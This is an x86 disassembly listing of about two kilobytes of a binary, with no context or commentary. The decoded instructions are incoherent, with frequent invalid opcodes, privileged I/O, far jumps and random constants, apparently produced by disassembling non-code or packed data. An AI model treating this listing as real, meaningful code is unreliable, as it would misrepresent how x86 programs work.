  4172fe:	mov    bh,0x8e
  417300:	retf   
  417301:	enter  0x886e,0xd
  417305:	sbb    al,0x4
  417307:	mov    ecx,0x58735deb
  41730c:	dec    eax
  41730d:	ds loop 0x417294
  417310:	pushf  
  417311:	add    ebp,DWORD PTR [ecx+edi*2-0x39]
  417315:	sti    
  417316:	aaa    
  417317:	and    edx,DWORD PTR [edi]
  417319:	(bad)  
  41731a:	fnstenv [ebx]
  41731c:	imul   ebp,DWORD PTR [ebx],0xfffffff0
  41731f:	pop    edi
  417320:	cmp    DWORD PTR [eax],0x1
  417323:	mov    esp,0x1368560
  417328:	dec    esi
  417329:	popf   
  41732a:	or     BYTE PTR [ecx],0x28
  41732d:	js     0x4172d5
  41732f:	adc    BYTE PTR [edi-0x1c],ah
  417332:	mov    BYTE PTR [ecx],dl
  417334:	std    
  417335:	or     BYTE PTR [edi-0x5f],al
  417338:	nop
  417339:	adc    cl,BYTE PTR [eax]
  41733b:	lods   al,BYTE PTR ds:[esi]
  41733c:	add    edi,DWORD PTR [edi+0x58]
  41733f:	add    al,0xe1
  417341:	inc    esi
  417342:	mov    ch,0xd3
  417344:	xor    dl,dh
  417346:	jl     0x41734c
  417348:	data16 or al,ch
  41734b:	inc    ecx
  41734c:	sub    DWORD PTR [edi+eax*8],eax
  41734f:	and    al,0x70
  417351:	mov    edx,esi
  417353:	(bad)  
  417354:	sub    dh,cl
  417356:	fsubr  QWORD PTR [edx+0x3d]
  417359:	push   eax
  41735a:	inc    ecx
  41735b:	mov    DWORD PTR [esi],edx
  41735d:	cwde   
  41735e:	lds    esi,FWORD PTR [ebp+0x20db6]
  417364:	cmovno edi,DWORD PTR [ecx+0x17]
  417368:	ins    BYTE PTR es:[edi],dx
  417369:	jp     0x417314
  41736b:	jne    0x417326
  41736d:	cmp    BYTE PTR [ecx-0x51e5b1de],dl
  417373:	add    ebp,DWORD PTR [edx]
  417375:	xor    ch,dh
  417377:	xor    edi,DWORD PTR [eax-0xc4965d5]
  41737d:	pop    ecx
  41737e:	and    ebp,ecx
  417380:	jl     0x41738f
  417382:	(bad)
  417385:	mov    DWORD PTR [edx-0x60],ebp
  417388:	(bad)  
  417389:	es repz js 0x41732e
  41738d:	or     ebx,eax
  41738f:	push   0x66
  417391:	push   ss
  417392:	cwde   
  417393:	and    DWORD PTR [edx],esi
  417395:	cmp    dh,dh
  417397:	sbb    cl,BYTE PTR [ebp-0x5f]
  41739a:	ss ins DWORD PTR es:[edi],dx
  41739c:	aad    0xe9
  41739e:	mov    ebx,0xcab7ccd3
  4173a3:	dec    DWORD PTR [ebp+0x11]
  4173a6:	add    al,0xcf
  4173a8:	dec    edi
  4173a9:	xchg   ecx,eax
  4173aa:	(bad)  
  4173ab:	ds and eax,0x255e75b9
  4173b1:	fidivr DWORD PTR [ecx+0x5286cc06]
  4173b7:	dec    ecx
  4173b8:	sbb    al,0xfb
  4173ba:	push   ss
  4173bb:	xchg   ebp,eax
  4173bc:	mov    cl,0xdd
  4173be:	or     bh,bh
  4173c0:	(bad)  
  4173c1:	jle    0x417390
  4173c3:	stos   BYTE PTR es:[edi],al
  4173c4:	dec    edi
  4173c5:	mov    WORD PTR [edx],gs
  4173c7:	sub    bl,bl
  4173c9:	jmp    0x11ef566a
  4173ce:	mov    esi,0x30d4ff39
  4173d3:	add    BYTE PTR [eax],ah
  4173d5:	fdiv   QWORD PTR [edx+0x7e7b5150]
  4173db:	push   ebx
  4173dc:	mov    bh,0xbf
  4173de:	xchg   BYTE PTR [edx-0x3a1bbb7a],dl
  4173e4:	adc    BYTE PTR [esi+0x58553a06],al
  4173ea:	xor    BYTE PTR [ecx+0x118a7953],0x39
  4173f1:	ret    0x2357
  4173f4:	mov    ebx,0x9105fdb9
  4173f9:	mov    eax,0xa258558d
  4173fe:	bound  eax,QWORD PTR [ecx+esi*4]
  417401:	inc    eax
  417402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417403:	adc    al,0xf1
  417405:	sbb    al,0x13
  417407:	mov    cl,0x96
  417409:	test   BYTE PTR [edx-0x243f05ef],dh
  41740f:	push   eax
  417410:	and    dh,BYTE PTR [esi+ecx*8-0x5c]
  417414:	mov    ebx,0x43d42a7b
  417419:	xchg   ecx,eax
  41741a:	and    eax,0x35035984
  41741f:	xor    DWORD PTR [ebp*2+0x3e3a3747],esp
  417426:	sub    BYTE PTR [eax],cl
  417428:	xor    dh,BYTE PTR [edi+0x3826ecd3]
  41742e:	std    
  41742f:	fs je  0x4174ad
  417432:	arpl   WORD PTR [esi+ecx*8-0x39],ax
  417436:	mov    esp,DWORD PTR [esi+0x7f92278b]
  41743c:	and    DWORD PTR [ebx],ebx
  41743e:	inc    edi
  41743f:	rol    BYTE PTR [ebp+0x7208fb6f],1
  417445:	out    dx,eax
  417446:	cld    
  417447:	jmp    0xaa692c9
  41744c:	mov    dh,0xd4
  41744e:	inc    edx
  41744f:	xchg   ecx,eax
  417450:	ds test al,0xc5
  417453:	xchg   ecx,eax
  417454:	pop    es
  417455:	(bad)  
  417456:	ins    BYTE PTR es:[edi],dx
  417457:	pop    es
  417458:	fcomp  QWORD PTR ds:0x199d2aaf
  41745e:	(bad)  
  417460:	pop    es
  417461:	arpl   bp,si
  417463:	and    BYTE PTR [edi-0x57],al
  417466:	sbb    eax,0xb90a6b5
  41746b:	xchg   edi,eax
  41746c:	fdivr  st,st(7)
  41746e:	push   ss
  41746f:	mov    cl,bl
  417471:	push   ebp
  417472:	ins    DWORD PTR es:[edi],dx
  417473:	mov    dh,0xf4
  417475:	inc    DWORD PTR [ecx]
  417477:	cs es cdq 
  41747a:	std    
  41747b:	fcmovnb st,st(1)
  41747d:	ret    
  41747e:	fisttp QWORD PTR [edx+0x4955dd5c]
  417484:	fild   QWORD PTR [edx-0x17eb4970]
  41748a:	xchg   DWORD PTR [edi+ecx*4-0x1326da2],esp
  417491:	dec    ecx
  417492:	push   ecx
  417493:	shl    bl,0xeb
  417496:	mov    esp,0x710b5aba
  41749b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41749c:	dec    edi
  41749d:	enter  0xee52,0xf5
  4174a1:	shl    BYTE PTR ds:0x641b906d,cl
  4174a7:	or     DWORD PTR ds:0x1b859d24,ebp
  4174ad:	jne    0x417461
  4174af:	add    ebp,edx
  4174b1:	cmp    bl,BYTE PTR [edx+0x27113e1b]
  4174b7:	sub    al,0xb9
  4174b9:	mov    edi,0x35d97261
  4174be:	pop    es
  4174bf:	bound  eax,QWORD PTR [edi+ebp*2-0x16ee9918]
  4174c6:	int3   
  4174c7:	adc    al,0x67
  4174c9:	and    BYTE PTR [ecx-0x63],cl
  4174cc:	out    dx,al
  4174cd:	and    DWORD PTR [edx+0x13],edx
  4174d0:	cmp    al,al
  4174d2:	les    esp,FWORD PTR [ebx-0x7af65976]
  4174d8:	outs   dx,BYTE PTR ds:[esi]
  4174d9:	or     BYTE PTR [edi-0x76],al
  4174dc:	cmp    DWORD PTR [eax+ebp*4-0x1],0xffffffad
  4174e1:	mov    al,0xed
  4174e3:	xor    bl,al
  4174e5:	adc    al,0x28
  4174e7:	ds pop ds
  4174e9:	ss ror edi,1
  4174ec:	dec    edx
  4174ed:	push   0x6f
  4174ef:	stc    
  4174f0:	push   0x3e
  4174f2:	scas   al,BYTE PTR es:[edi]
  4174f3:	into   
  4174f4:	cdq    
  4174f5:	and    DWORD PTR [edx],ecx
  4174f7:	pop    es
  4174f8:	cmp    DWORD PTR [ebp-0x23],edi
  4174fb:	bound  eax,QWORD PTR [ecx]
  4174fd:	out    0x7d,eax
  4174ff:	pop    esi
  417500:	inc    esp
  417501:	es loopne 0x4174c7
  417504:	jns    0x417560
  417506:	lahf   
  417507:	call   esi
  417509:	les    edx,FWORD PTR [ecx]
  41750b:	mov    eax,0xde025cfa
  417510:	inc    edi
  417511:	dec    ebx
  417512:	test   eax,0x39e49d6e
  417517:	cmp    DWORD PTR [edx-0x3d],edx
  41751a:	or     eax,0x1a038154
  41751f:	shl    DWORD PTR [edx+edx*8+0x621f0c07],0x5e
  417527:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417528:	cld    
  417529:	adc    BYTE PTR [edi+0x1e],ah
  41752c:	gs sbb edi,ebx
  41752f:	cmp    eax,0xe507e0df
  417534:	pop    esp
  417535:	mov    ebp,0xbaa195b8
  41753a:	(bad)  
  41753b:	cmp    edx,DWORD PTR [ecx+0x4d576884]
  417541:	push   eax
  417542:	test   BYTE PTR [esi-0x64d0bc0e],al
  417548:	mov    bh,0x9c
  41754a:	mov    eax,ds:0x80912dff
  41754f:	cmp    bp,WORD PTR [ecx+0xbb03dea]
  417556:	les    edi,FWORD PTR [esi]
  417558:	shl    ebx,0x9b
  41755b:	xchg   ebx,eax
  41755c:	sar    dl,1
  41755e:	xchg   ecx,eax
  41755f:	xor    eax,0x64cfb1e6
  417564:	push   esi
  417565:	add    BYTE PTR [ebx],0x9b
  417568:	shl    al,cl
  41756a:	sub    bl,BYTE PTR [ebp+0x179bbc02]
  417570:	inc    edx
  417571:	mov    DWORD PTR [ebp-0x6c],esp
  417574:	push   ecx
  417575:	popf   
  417576:	int3   
  417577:	dec    edx
  417578:	xchg   BYTE PTR [ebx-0x5b],ch
  41757b:	cmp    eax,0x3825284b
  417580:	xchg   esp,eax
  417581:	and    eax,0xbf861669
  417586:	pop    esp
  417587:	pop    ds
  417588:	test   al,0xbf
  41758a:	jbe    0x4175dd
  41758c:	daa    
  41758d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41758e:	arpl   WORD PTR [edx+edx*1],cx
  417591:	jmp    0xfdcb:0xd4d4e580
  417598:	cmc    
  417599:	into   
  41759a:	jecxz  0x4175a4
  41759c:	jnp    0x417598
  41759e:	sub    ebx,DWORD PTR [edx-0x5]
  4175a1:	push   0x3e70c2c7
  4175a6:	in     al,0xbe
  4175a8:	loope  0x4175fa
  4175aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175ab:	push   cs
  4175ac:	pop    ebx
  4175ad:	or     edx,eax
  4175af:	nop
  4175b0:	or     dh,BYTE PTR ds:0xd0dc45f7
  4175b6:	push   ebx
  4175b7:	stc    
  4175b8:	fsubr  QWORD PTR [esi-0x46150510]
  4175be:	and    ebx,DWORD PTR [edi-0x4c]
  4175c1:	and    ch,BYTE PTR [edx+eiz*1-0xa]
  4175c5:	mov    WORD PTR [esi+eiz*1-0x1cbe8c],cs
  4175cc:	sub    ebp,DWORD PTR [ebx+0x12]
  4175cf:	pop    edx
  4175d0:	inc    esi
  4175d1:	inc    eax
  4175d2:	sbb    ecx,0x3ba34c59
  4175d8:	lods   al,BYTE PTR ds:[esi]
  4175d9:	stos   DWORD PTR es:[edi],eax
  4175da:	xchg   esi,eax
  4175db:	not    DWORD PTR [ebp-0x5]
  4175de:	sub    edi,0x5ddcf445
  4175e4:	cld    
  4175e5:	aam    0x48
  4175e7:	cmp    BYTE PTR [eax-0x6ae5c1f0],0xde
  4175ee:	mov    dh,0xc1
  4175f0:	push   edx
  4175f1:	jg     0x41758c
  4175f3:	or     bl,BYTE PTR [ecx-0xc]
  4175f6:	test   DWORD PTR [esi+0x30b104f6],edx
  4175fc:	je     0x417649
  4175fe:	fbstp  TBYTE PTR [ebx+0x17f2322a]
  417604:	fsubp  st(2),st
  417606:	or     eax,0xdb122928
  41760b:	mov    ds:0x8ffcaf66,al
  417610:	xchg   ecx,eax
  417611:	sub    DWORD PTR [ecx-0x68],ebp
  417614:	push   es
  417615:	push   esi
  417616:	fs push esi
  417618:	cmp    BYTE PTR [eax-0x7],al
  41761b:	dec    esi
  41761c:	cmp    al,0x33
  41761e:	mov    cl,bl
  417620:	fst    DWORD PTR [ebp+0x27]
  417623:	or     al,0xbb
  417625:	ficomp DWORD PTR [esi-0x1c20625f]
  41762b:	mov    dl,0x14
  41762d:	dec    esi
  41762e:	in     eax,0xc
  417630:	loope  0x41762b
  417632:	hlt    
  417633:	xchg   edx,eax
  417634:	hlt    
  417635:	mov    ds:0x69cf096b,al
  41763a:	int    0xd9
  41763c:	mov    ebp,DWORD PTR [eax-0x29]
  41763f:	and    eax,0xa7af4cc
  417644:	adc    ah,BYTE PTR [edx+0x2c]
  417647:	js     0x417620
  417649:	leave  
  41764a:	xchg   BYTE PTR [edx],bh
  41764c:	push   esp
  41764d:	jge    0x4175dd
  41764f:	ja     0x41760d
  417651:	rcl    DWORD PTR [esi],0x93
  417654:	inc    esp
  417655:	xchg   ecx,eax
  417656:	push   ecx
  417657:	push   0xa7122c92
  41765c:	imul   esp,DWORD PTR [ecx],0xffffff94
  41765f:	ins    BYTE PTR es:[edi],dx
  417660:	outs   dx,DWORD PTR ds:[esi]
  417661:	cmc    
  417662:	adc    esi,DWORD PTR ds:0x5d773f33
  417668:	test   DWORD PTR [edx-0x290cfc17],edx
  41766e:	shr    BYTE PTR [eax],cl
  417670:	fwait
  417671:	dec    ecx
  417672:	inc    edx
  417673:	ret    0x9945
  417676:	(bad)  
  417677:	ret    
  417678:	cmp    al,0x0
  41767a:	cmp    DWORD PTR [eax+0x33],esi
  41767d:	mov    al,0x62
  41767f:	in     eax,0x52
  417681:	pcmpgtd mm2,QWORD PTR [ecx+0x54cf6934]
  417688:	or     BYTE PTR [ecx-0xc],0x7b
  41768c:	fdivr  DWORD PTR ds:0xc8b3587a
  417692:	add    eax,0xc1dbe289
  417697:	ror    ebx,0x3a
  41769a:	cmp    ecx,DWORD PTR [eax+0x31e96f84]
  4176a0:	inc    eax
  4176a1:	test   BYTE PTR [esi],dh
  4176a3:	dec    eax
  4176a4:	dec    esp
  4176a5:	push   cs
  4176a6:	pop    edx
  4176a7:	dec    DWORD PTR ds:0x80eec9a6
  4176ad:	xchg   ebx,eax
  4176ae:	xlat   BYTE PTR ds:[ebx]
  4176af:	fprem  
  4176b1:	mov    BYTE PTR [edx],0x3e
  4176b4:	lds    ecx,FWORD PTR [edx+0x1e787be5]
  4176ba:	mov    dl,0x58
  4176bc:	std    
  4176bd:	cmp    DWORD PTR [eax+0x1c82ae19],eax
  4176c3:	mov    dh,dh
  4176c5:	jno    0x41773d
  4176c7:	and    al,BYTE PTR fs:[ebp+0x76]
  4176cb:	add    BYTE PTR [esp+eax*1-0x6b],dh
  4176cf:	push   edi
  4176d0:	push   DWORD PTR ds:0xfbebb8b
  4176d6:	sti    
  4176d7:	test   DWORD PTR [edi+0x3],ebx
  4176da:	sbb    eax,0x430dade
  4176df:	add    DWORD PTR [edx+0x78417cf],edx
  4176e5:	das    
  4176e6:	pop    eax
  4176e7:	stos   DWORD PTR es:[edi],eax
  4176e8:	push   DWORD PTR [edx+0x54626ae9]
  4176ee:	int3   
  4176ef:	jg     0x417704
  4176f1:	test   DWORD PTR ds:[ecx+edi*4-0x520d2b63],0x7b0939ba
  4176fd:	lods   al,BYTE PTR ds:[esi]
  4176fe:	push   ebx
  4176ff:	mov    edi,ebx
  417701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417702:	and    DWORD PTR [ebx],ebp
  417704:	aas    
  417705:	push   ebp
  417706:	mov    edi,ebx
  417708:	or     eax,0xdd693b90
  41770d:	sbb    eax,0x4fd6cca3
  417712:	test   al,0xbe
  417714:	jo     0x4176a0
  417716:	cmp    cl,BYTE PTR [ecx+0x6f]
  417719:	leave  
  41771a:	or     dl,BYTE PTR [eax]
  41771c:	popa   
  41771d:	or     ch,BYTE PTR [esi]
  41771f:	jmp    0xf7bb396d
  417724:	xchg   ebp,eax
  417725:	cmc    
  417726:	sahf   
  417727:	out    dx,al
  417728:	ret    0x65eb
  41772b:	arpl   WORD PTR [edi-0x495b68d3],si
  417731:	or     DWORD PTR [edi+0x3a793440],ebx
  417737:	sub    al,0x74
  417739:	shl    BYTE PTR [edi],0xdd
  41773c:	mov    ebx,0xd8a9585e
  417741:	dec    esi
  417742:	test   DWORD PTR [ecx-0x3],esi
  417745:	retf   
  417746:	pop    edi
  417747:	ins    DWORD PTR es:[edi],dx
  417748:	pop    esi
  417749:	xchg   BYTE PTR [esi],al
  41774b:	jmp    0x7ed6:0x1755c06e
  417752:	fdivr  DWORD PTR [edx]
  417754:	les    edx,FWORD PTR ds:0xefb5ef9b
  41775a:	out    dx,eax
  41775b:	dec    esp
  41775c:	ds cmc 
  41775e:	cmp    bh,BYTE PTR [edx]
  417760:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417761:	stos   DWORD PTR es:[edi],eax
  417762:	sbb    al,0x33
  417764:	dec    edi
  417765:	pushf  
  417766:	cmp    DWORD PTR [ecx+0x274a03a3],0xffffffa4
  41776d:	sub    DWORD PTR [eax-0x6b],edi
  417770:	mov    edi,0x8824ef64
  417775:	or     al,0x64
  417777:	retf   
  417778:	repnz bound ecx,QWORD PTR [edx]
  41777b:	jg     0x41778c
  41777d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41777e:	and    BYTE PTR [eax+0x57],dh
  417781:	test   eax,0x164208f7
  417786:	push   ebx
  417787:	adc    DWORD PTR [esi],edi
  417789:	mov    eax,DWORD PTR [ebp-0x37cff3b1]
  41778f:	sbb    bh,0x91
  417792:	sub    BYTE PTR [eax],cl
  417794:	mov    al,ds:0xa5a9de80
  417799:	pop    edx
  41779a:	lds    eax,FWORD PTR [edx+eax*4]
  41779d:	pop    es
  41779e:	ds aaa 
  4177a0:	sbb    bh,BYTE PTR [ebx]
  4177a2:	(bad)  
  4177a3:	fnstcw WORD PTR [ecx-0x52854570]
  4177a9:	fdivrp st(5),st
  4177ab:	or     DWORD PTR [ebp+ebx*2+0x60],ebx
  4177af:	ret    0x2f29
  4177b2:	ja     0x4177e4
  4177b4:	cmp    edx,DWORD PTR [edi+esi*8-0x449f0723]
  4177bb:	in     eax,dx
  4177bc:	sahf   
  4177bd:	cld    
  4177be:	cmc    
  4177bf:	add    dh,BYTE PTR [esi-0x6c]
  4177c2:	mov    ecx,0xb8e7baaf
  4177c7:	shl    BYTE PTR [edi],0xef
  4177ca:	push   esi
  4177cb:	fld    DWORD PTR [ebx+eiz*1+0x50]
  4177cf:	mov    dh,0xa6
  4177d1:	sub    eax,0x83ecd1ec
  4177d6:	cs in  al,0xd4
  4177d9:	adc    eax,0xeaf4e756
  4177de:	xor    DWORD PTR [eax],esi
  4177e0:	div    bl
  4177e2:	jnp    0x4177dc
  4177e4:	xchg   ebx,eax
  4177e5:	movhps QWORD PTR [edx+ebp*1],xmm2
  4177e9:	pop    DWORD PTR [ecx+0x47]
  4177ec:	sub    DWORD PTR [edi+0x64],esp
  4177ef:	aad    0xd5
  4177f1:	mov    bh,0x9c
  4177f3:	mov    ebp,0x6631a15d
  4177f8:	add    BYTE PTR [edi-0x68],dh
  4177fb:	in     al,dx
  4177fc:	push   cs
  4177fd:	int    0x5e
  4177ff:	loope  0x41784b
  417801:	int3   
  417802:	pop    ecx
  417803:	xchg   ebx,eax
  417804:	es iret 
  417806:	inc    eax
  417807:	push   ebx
  417808:	jns    0x4177b4
  41780a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41780b:	cli    
  41780c:	inc    ecx
  41780d:	mov    eax,ds:0x55485743
  417812:	scas   eax,DWORD PTR es:[edi]
  417813:	mov    edi,0x6264a436
  417818:	jp     0x417859
  41781a:	test   eax,0xe6734378
  41781f:	test   DWORD PTR [esi+ebx*2],edx
  417822:	xor    al,0xcf
  417824:	dec    edi
  417825:	fld    TBYTE PTR [edx+ecx*4]
  417828:	dec    ebp
  417829:	cwde   
  41782a:	or     dh,bl
  41782c:	dec    edx
  41782d:	inc    eax
  41782e:	sub    esi,DWORD PTR es:0x50195f90
  417835:	test   BYTE PTR [ebx-0x2632a8b1],dh
  41783b:	clc    
  41783c:	lds    eax,FWORD PTR [ebx-0x4]
  41783f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417840:	xor    eax,0x5d4ec3bd
  417845:	aas    
  417846:	xor    DWORD PTR [ebx+eax*8+0x724b4f84],edx
  41784d:	mov    ah,0x4b
  41784f:	xlat   BYTE PTR ds:[ebx]
  417850:	and    DWORD PTR [eax],ebp
  417852:	(bad)  
  417853:	repnz push ss
  417855:	and    DWORD PTR [ecx],0x64cbcd71
  41785b:	pop    ebx
  41785c:	jno    0x4178c8
  41785e:	push   es
  41785f:	test   DWORD PTR [ebp+0x76],eax
  417862:	pop    ss
  417863:	dec    edx
  417864:	mov    bh,0x56
  417866:	or     eax,0x420165c3
  41786b:	add    BYTE PTR [edi-0x69],dh
  41786e:	clc    
  41786f:	dec    esp
  417870:	(bad)  
  417871:	mov    dh,dl
  417873:	arpl   WORD PTR [edi],si
  417875:	ds mov bh,ah
  417878:	push   esi
  417879:	lahf   
  41787a:	lahf   
  41787b:	inc    esp
  41787c:	fs mov bl,0x14
  41787f:	xor    eax,0xe02fc883
  417884:	push   ds
  417885:	xchg   esp,eax
  417886:	(bad)  
  417887:	retf   0x2b75
  41788a:	mov    esp,DWORD PTR [ebp-0x618eb828]
  417890:	jmp    0xc75afc77
  417895:	xchg   esi,eax
  417896:	jmp    0xb725:0x2e7efe46
  41789d:	inc    esp
  41789e:	jl     0x41787e
  4178a0:	dec    ebx
  4178a1:	jne    0x417824
  4178a3:	in     eax,0x3
  4178a5:	(bad)  
  4178a6:	int3   
  4178a7:	push   edi
  4178a8:	dec    edx
  4178a9:	adc    edx,DWORD PTR [eax+0x1a895bb9]
  4178af:	mov    bh,BYTE PTR [eax+0x15]
  4178b2:	out    dx,eax
  4178b3:	xor    ecx,DWORD PTR [eax]
  4178b5:	pop    ebx
  4178b6:	es (bad) 
  4178b8:	in     eax,dx
  4178b9:	(bad)  [edx-0x2f4f01e9]
  4178bf:	or     DWORD PTR [ebx+0x1d],edi
  4178c2:	add    bh,BYTE PTR [ebx+0x6d]
  4178c5:	and    ecx,DWORD PTR [edx]
  4178c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178c8:	hlt    
  4178c9:	jbe    0x417938
  4178cb:	inc    ecx
  4178cc:	out    dx,al
  4178cd:	ins    BYTE PTR es:[edi],dx
  4178ce:	out    dx,al
  4178cf:	out    dx,eax
  4178d0:	xor    esp,DWORD PTR [ebx-0x50]
  4178d3:	arpl   WORD PTR [edi-0x4d],ax
  4178d6:	ins    BYTE PTR es:[edi],dx
  4178d7:	out    0x89,eax
  4178d9:	shl    dh,1
  4178db:	in     eax,dx
  4178dc:	inc    eax
  4178dd:	scas   al,BYTE PTR es:[edi]
  4178de:	push   edx
  4178df:	aad    0x8f
  4178e1:	(bad)  [eax+0x5a32d6bb]
  4178e7:	or     DWORD PTR [ebx],esp
  4178e9:	stos   DWORD PTR es:[edi],eax
  4178ea:	mov    gs,WORD PTR [eax+0x12]
  4178ed:	bound  ecx,QWORD PTR [edx]
  4178ef:	pop    es
  4178f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178f1:	repz (bad) 
  4178f3:	mov    edi,0x83f93a59
  4178f8:	push   edx
  4178f9:	cmp    eax,esi
  4178fb:	mov    edi,0x9309ed61
  417900:	ss out dx,al
  417902:	pop    ebx
  417903:	cmp    ecx,DWORD PTR [edi+0x765a6334]
  417909:	loop   0x417989
  41790b:	repz mov ds:0x46b33135,eax
  417911:	ret    0x811a
  417914:	push   esi
  417915:	inc    ebx
  417916:	repz sbb al,dl
  417919:	xchg   ebx,eax
  41791a:	repz push ebp
  41791c:	clc    
  41791d:	pop    esp
  41791e:	jge    0x41797e
  417920:	ret    
  417921:	xchg   DWORD PTR [ecx+0x5d],esi
  417924:	xor    al,BYTE PTR [esi+0x7c2ae6c]
  41792a:	(bad)  
  41792d:	pop    edi
  41792e:	out    dx,eax
  41792f:	cmp    al,0xb1
  417931:	mov    ds:0xec669c,al
  417936:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417937:	and    dh,dh
  417939:	(bad)  
  41793a:	leave  
  41793b:	xlat   BYTE PTR ds:[ebx]
  41793c:	sbb    ch,dl
  41793e:	mov    eax,0xc546306
  417943:	test   BYTE PTR [ecx-0x1f],cl
  417946:	in     al,dx
  417947:	adc    ecx,DWORD PTR [edx+ecx*1]
  41794a:	(bad)
  41794e:	inc    esp
  41794f:	pop    ebx
  417950:	call   FWORD PTR [ebp+0x1]
  417953:	leave  
  417954:	jecxz  0x417998
  417956:	stos   BYTE PTR es:[edi],al
  417957:	ret    0x6673
  41795a:	sub    eax,0x607dc08a
  41795f:	push   ebx
  417960:	inc    eax
  417961:	outs   dx,DWORD PTR ds:[esi]
  417962:	clc    
  417963:	je     0x41794a
  417965:	inc    ebp
  417966:	and    eax,0x28c4846a
  41796b:	add    BYTE PTR [edx],0xc9
  41796e:	push   edx
  41796f:	xchg   ecx,eax
  417970:	fadd   DWORD PTR es:[edx+eax*8]
  417974:	arpl   WORD PTR [ecx],dx
  417976:	aas    
  417977:	pop    es
  417978:	fisub  DWORD PTR [ecx]
  41797a:	lea    esp,[ebx+0x1879635a]
  417980:	pop    ebx
  417981:	ret    0xc3b0
  417984:	jae    0x417936
  417986:	scas   eax,DWORD PTR es:[edi]
  417987:	or     BYTE PTR [esi+ebp*1-0x1f9c6c05],dh
  41798e:	pop    eax
  41798f:	push   ss
  417990:	lock popf 
  417992:	out    0x3a,al
  417994:	stos   DWORD PTR es:[edi],eax
  417995:	mov    dh,0x2c
  417997:	sti    
  417998:	cs pop esi
  41799a:	pop    esp
  41799b:	and    BYTE PTR [edi],dh
  41799d:	shr    DWORD PTR [esi+0x19],0xdb
  4179a1:	nop
  4179a2:	leave  
  4179a3:	add    al,0xfc
  4179a5:	xchg   edi,eax
  4179a6:	mov    DWORD PTR [ebx+ebx*4],ebx
  4179a9:	mov    bh,0xe3
  4179ab:	push   ecx
  4179ac:	adc    al,0x42
  4179ae:	shr    DWORD PTR [eax-0x5b5ad539],0x7e
  4179b5:	push   0xffffffa4
  4179b7:	dec    ebp
  4179b8:	jae    0x41798d
  4179ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179bb:	fild   QWORD PTR [edi+0x41]
  4179be:	sub    ch,BYTE PTR [esi]
  4179c0:	cmp    al,0x60
  4179c2:	retf   
  4179c3:	out    dx,eax
  4179c4:	(bad)  
  4179c5:	jno    0x4179dc
  4179c7:	outs   dx,DWORD PTR ds:[esi]
  4179c8:	inc    esi
  4179c9:	retf   0x1b67
  4179cc:	sub    eax,DWORD PTR [ebx+0x1b]
  4179cf:	retf   
  4179d0:	cmp    cl,dh
  4179d2:	ror    bl,1
  4179d4:	mov    ss,eax
  4179d6:	jg     0x4179bf
  4179d8:	push   esp
  4179d9:	sub    edx,ebx
  4179db:	sbb    al,0xd6
  4179dd:	push   es
  4179de:	add    eax,0x99e1a523
  4179e3:	mov    al,0x39
  4179e5:	sar    BYTE PTR [edi+0x4ece6f5f],cl
  4179eb:	inc    esi
  4179ec:	add    eax,0x3295c334
  4179f1:	sub    ah,dl
  4179f3:	in     al,dx
  4179f4:	inc    edi
  4179f5:	jmp    0x6f20:0x57a95fc1
  4179fc:	jns    0x417a54
  4179fe:	add    DWORD PTR [ebp+ebx*4+0x24bc10d3],esi
  417a05:	test   DWORD PTR [eax+ecx*1],eax
  417a08:	ins    BYTE PTR es:[edi],dx
  417a09:	and    cl,BYTE PTR [ebx-0x3a]
  417a0c:	xchg   edi,eax
  417a0d:	mov    dl,0xe7
  417a0f:	mov    bl,0x2c
  417a11:	dec    edi
  417a12:	add    DWORD PTR [edi+ebp*2],edi
  417a15:	mov    esp,0xa57cc5af
  417a1a:	pusha  
  417a1b:	je     0x417a4c
  417a1d:	mov    bh,BYTE PTR [edx+0x67]
  417a20:	cmp    al,0x71
  417a22:	fst    st(7)
  417a24:	imul   edi,DWORD PTR [esi-0x2e28c3db],0x3f
  417a2b:	shr    DWORD PTR [ecx-0x16e13da7],1
  417a31:	add    al,0x5
  417a33:	bound  esi,QWORD PTR [ecx+0x20c91849]
  417a39:	scas   al,BYTE PTR es:[edi]
  417a3a:	test   al,0xb2
  417a3c:	mov    ah,0x8e
  417a3e:	add    eax,DWORD PTR [edi-0x26]
  417a41:	push   edi
  417a42:	dec    esp
  417a43:	fistp  QWORD PTR [edi]
  417a45:	fs jne 0x417a85
  417a48:	cdq    
  417a49:	push   cs
  417a4a:	mov    edi,0x7ffe132b
  417a4f:	or     cl,BYTE PTR [eax-0x5d]
  417a52:	mov    ecx,0xdcffdaf4
  417a57:	push   ebp
  417a58:	cli    
  417a59:	ror    ebp,cl
  417a5b:	sub    al,0x80
  417a5d:	fidiv  WORD PTR [esi+0xc3c2d50]
  417a63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a64:	retf   0x70b2
  417a67:	outs   dx,DWORD PTR ds:[esi]
  417a68:	sub    al,0xe
  417a6a:	jle    0x417a4d
  417a6c:	cmp    BYTE PTR [edx],al
  417a6e:	arpl   WORD PTR [eax],cx
  417a70:	inc    edx
  417a71:	aam    0xc3
  417a73:	iret   
  417a74:	aad    0xba
  417a76:	mov    edx,0xa9417236
  417a7b:	ret    0xa82c
  417a7e:	and    DWORD PTR [ecx+ecx*4],esp
  417a81:	repnz push ebx
  417a83:	xor    al,0x46
  417a85:	xchg   edi,eax
  417a86:	call   0xa73:0x7af6986f
  417a8d:	xchg   esp,eax
  417a8e:	mov    WORD PTR [edi-0x58],cs
  417a91:	(bad)  
  417a92:	leave  
  417a93:	cmp    eax,0x6d3bb6bd
  417a98:	pushf  
  417a99:	sahf   
  417a9a:	xchg   edi,eax
  417a9b:	mov    ebp,0xccf6a3d3
  417aa0:	ss add dl,0x36
  417aa4:	test   DWORD PTR [ebx-0x68],esi
  417aa7:	pusha  
